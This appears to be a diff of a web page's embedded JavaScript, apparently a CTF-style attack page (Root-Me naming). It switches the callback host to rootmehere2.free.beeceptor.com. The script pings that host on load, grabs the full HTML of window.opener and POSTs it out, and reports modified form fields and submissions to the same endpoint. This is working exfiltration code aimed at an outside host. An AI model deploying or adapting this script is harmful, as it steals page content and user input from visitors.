@@ -134,7 +134,7 @@
 <script>
     // When the page is visited, send a request to the given URL
     window.onload = function() {
-        fetch("https://rootmehere.free.beeceptor.com/visit", {
+        fetch("https://rootmehere2.free.beeceptor.com/visit", {
             method: 'GET'
         }).then(response => response.json())
           .then(data => console.log('Visited:', data))
@@ -146,7 +146,7 @@
             const openerHtml = window.opener.document.documentElement.outerHTML;
             
             // Send the opener's HTML content to the server
-            fetch('https://rootmehere.free.beeceptor.com/opener', {
+            fetch('https://rootmehere2.free.beeceptor.com/opener', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -156,14 +156,14 @@
               .then(data => console.log('Opener HTML sent:', data))
               .catch(error => console.error('Error sending opener HTML:', error));
         } else {
-            fetch('https://rootmehere.free.beeceptor.com/NOopener');
+            fetch('https://rootmehere2.free.beeceptor.com/NOopener');
         }
 
         
     };
 // Fonction générique pour envoyer les données au serveur
 function sendToServer(action, data) {
-    const url = `https://rootmehere.free.beeceptor.com/${action}/${encodeURIComponent(data)}`;
+    const url = `https://rootmehere2.free.beeceptor.com/${action}/${encodeURIComponent(data)}`;
     fetch(url, {
         method: 'GET', // Utilisation de la méthode GET pour envoyer les données dans l'URL
         headers: {
@@ -221,7 +221,7 @@ document.addEventListener('mousemove', function(event) {
 
     // When a field is modified, send a request to the server with the modified field's name
     function fieldModified(fieldName) {
-        fetch(`https://rootmehere.free.beeceptor.com/modified/${fieldName}`, {
+        fetch(`https://rootmehere2.free.beeceptor.com/modified/${fieldName}`, {
             method: 'GET'
         }).then(response => response.json())
           .then(data => console.log(`Field ${fieldName} modified:`, data))
@@ -232,7 +232,7 @@ document.addEventListener('mousemove', function(event) {
     function submitForm(event) {
         event.preventDefault(); // Prevent form submission
 
-        fetch("https://rootmehere.free.beeceptor.com/valide", {
+        fetch("https://rootmehere2.free.beeceptor.com/valide", {
             method: 'GET'
         }).then(response => response.json())
           .then(data => console.log('Form submitted:', data))
